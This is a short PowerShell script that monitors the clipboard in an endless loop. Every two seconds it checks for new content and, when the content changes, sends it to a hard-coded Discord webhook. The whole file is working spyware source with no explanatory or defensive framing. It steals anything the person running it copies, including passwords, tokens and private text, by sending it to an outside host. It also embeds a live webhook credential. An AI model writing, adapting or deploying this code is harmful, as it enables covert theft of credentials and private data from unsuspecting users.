# Webhook
$webhookUrl = "https://discord.com/api/webhooks/1097024921110073364/K6CyIZqz9E4r8jHXQWxfWhnsO_QMf2ejitbzR-YWemf-80raq2L8fEw_EDf451keRDnU"

$prevClipboardContent = ""

function Get-LolYeet {
    param($Content)

    $payload = @{
        content = $Content
    }

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
}

while ($true) {

    $currentClipboardContent = Get-Clipboard


    if ($currentClipboardContent -ne $prevClipboardContent) {

        Get-LolYeet -Content $currentClipboardContent

        $prevClipboardContent = $currentClipboardContent
    }

    Start-Sleep -Seconds 2
}
